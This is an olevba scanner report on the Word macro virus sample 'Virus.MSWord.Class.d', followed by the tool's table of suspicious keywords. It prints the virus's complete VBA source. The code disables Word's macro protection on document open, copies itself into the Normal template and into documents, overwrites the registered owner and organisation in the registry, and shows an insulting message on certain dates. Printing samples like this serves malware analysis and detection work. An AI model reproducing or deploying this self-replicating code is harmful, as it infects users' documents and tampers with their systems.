olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-1e78553a4f9142fa8fd3bad41d5f38486189ad48
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-1e78553a4f9142fa8fd3bad41d5f38486189ad48 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Const REG_SZ As Long = 1
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Const HKEY_CURRENT_USER As Long = &H80000001
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Sub AutoOpen()
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
On Error GoTo out
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Options.VirusProtection = False
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Options.SaveNormalPrompt = False
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Options.ConfirmConversions = False
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If nt > 70 And ad > 0 Then GoTo out
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If nt < 70 Then
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End If
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
host.codemodule.AddFromFile ("c:\class.sys")
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
With host.codemodule
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    For x = 1 To 16
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    .deletelines 1
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    Next x
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End With
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If nt < 70 Then
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    With host.codemodule
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    .replaceline 1, "Sub AutoClose()"
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    .replaceline 91, "Sub ToolsMacro()"
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    For x = 70 To 81
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
        .deletelines 62
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    Next x
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    .replaceline 35, "    For x = 1 To 4"
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    End With
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End If
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If nt < 70 Then
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
u = RegCloseKey(k)
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End If
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
With host.codemodule
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    For x = 2 To 104 Step 2
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
    Next x
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End With
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
out:
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End Sub
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
Sub ViewVBCode()
'DAS20-06-2000 11:41:29Canon BJC-6100 on LPT1:timz boekenlijst eng
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

